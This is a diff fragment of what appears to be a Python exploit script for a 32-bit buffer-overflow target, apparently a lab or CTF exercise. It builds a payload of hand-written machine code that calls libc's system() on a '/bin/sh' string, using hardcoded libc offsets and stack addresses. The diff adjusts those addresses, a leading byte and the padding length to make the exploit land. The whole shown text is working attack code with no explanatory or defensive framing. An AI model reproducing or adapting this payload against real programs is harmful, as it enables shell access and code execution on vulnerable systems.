@@ -7,15 +7,15 @@ libc_base_addr = 0xb7e2c000
 exit_offset = 0x32be0
 system_offset = 0x0003f060 
 bin_sh_offset = 0x160c58
-str_addr = 0xbfffff4f
-shellcode_address = 0xbffff5e6
+str_addr = 0xbfffff58
+shellcode_address = 0xbffff5f7
 
 # Create the payload
-payload = b"\xC7\x04\x24"  # mov_dword
+payload = b"\xaa\xC7\x04\x24"  # mov_dword
 payload += struct.pack("<I", str_addr)
 payload += b"\xe8"          # call
 payload += struct.pack("<i", libc_base_addr + system_offset - (shellcode_address + 12)) # current address for relative call
-payload += b"a" * 8
+payload += b"a" * 7
 payload += b"\x0a"
 payload += b"\x00" * (0x1000 - 21)
 payload += b"a" * 5
